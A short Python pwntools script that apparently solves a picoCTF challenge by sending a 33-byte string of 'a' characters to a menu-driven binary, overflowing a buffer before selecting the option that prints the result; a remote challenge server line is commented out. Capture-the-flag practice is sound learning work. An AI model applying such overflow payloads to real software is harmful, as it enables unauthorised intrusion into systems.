from pwn import *

p = process('chall')

#p = remote("tethys.picoctf.net", 55850)

payload = "a" * 33

p.recvuntil("choice:")

p.sendline("2")
p.sendline(payload)

p.recvuntil("choice:")
p.sendline("4")

print(p.recvall())
